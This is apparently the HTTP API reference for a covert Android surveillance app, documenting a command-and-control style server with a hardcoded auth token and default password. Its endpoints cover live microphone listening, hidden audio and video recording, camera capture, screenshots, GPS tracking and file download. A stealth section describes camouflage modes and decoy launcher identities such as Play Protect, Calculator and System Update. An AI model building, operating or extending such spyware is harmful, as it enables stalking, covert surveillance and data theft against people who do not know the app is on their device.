# 04 ⏤ Device HTTP API Reference

> The on-device server binds to port `9191` and exposes control endpoints over HTTP/JSON.

---

## 🔑 Authentication

All endpoints require authentication via session cookie or parameter:
- **Session Cookie**: `c2_auth_token=AUTH_OK_1337` (issued upon POST to `/login` with valid password).
- **Default Credentials**: Password defaults to `admin1337` on fresh installs until customized.

---

## 🎙️ Acoustics & Audio Control Endpoints

| Endpoint | Method | Parameters | Description |
| :--- | :--- | :--- | :--- |
| `/audio` | `GET` | — | Renders the main Acoustics Control HTML dashboard page. |
| `/audio/speak` | `GET` / `POST` | `text`, `vol` (10–100), `voice` | Transmits text to be spoken out loud via device speakers. |
| `/audio/chunk` | `GET` | `t` (timestamp) | Returns a 1-second WAV microphone audio chunk for live listening. |
| `/audio/status` | `GET` | — | Returns JSON status (`isRecording`, `duration`, `recordingPath`). |
| `/audio/mic/start` | `GET` | `duration` (seconds, optional) | Starts background microphone recording. |
| `/audio/mic/stop` | `GET` | — | Stops background microphone recording and saves file to vault. |

---

## 📸 Camera & Optics Endpoints

| Endpoint | Method | Parameters | Description |
| :--- | :--- | :--- | :--- |
| `/camera/photo` | `GET` | `cam` (front/rear) | Captures a high-resolution photo from chosen camera. |
| `/camera/frame` | `GET` | `cam`, `quality` | Returns a single JPEG frame for live camera streaming. |
| `/camera/record/start`| `GET` | `cam`, `duration` | Starts background video recording. |

---

## 🎭 Ghost & Stealth Endpoints

| Endpoint | Method | Parameters | Description |
| :--- | :--- | :--- | :--- |
| `/ghost/screenshot` | `GET` | — | Captures an un-dimmed 720p HD screenshot of current screen. |
| `/device/decoy` | `GET` | `choice` (1–5) | Switches active launcher decoy persona (Play Protect, Calculator, Weather, System Update, Smart Tutor). |
| `/stealth` | `GET` | `type`, `action` | Toggles stealth camouflage mode ON or OFF. |
| `/ghost/toast` | `GET` | `msg`, `size`, `color` | Displays custom toast overlay text on device screen. |

---

## 📍 Location & Storage Endpoints

| Endpoint | Method | Parameters | Description |
| :--- | :--- | :--- | :--- |
| `/gps/locate` | `GET` | — | Returns precise GPS latitude/longitude coordinates. |
| `/files` | `GET` | `path` | Lists directory contents and files in device storage. |
| `/download/*` | `GET` | — | Downloads specified file from device storage. |
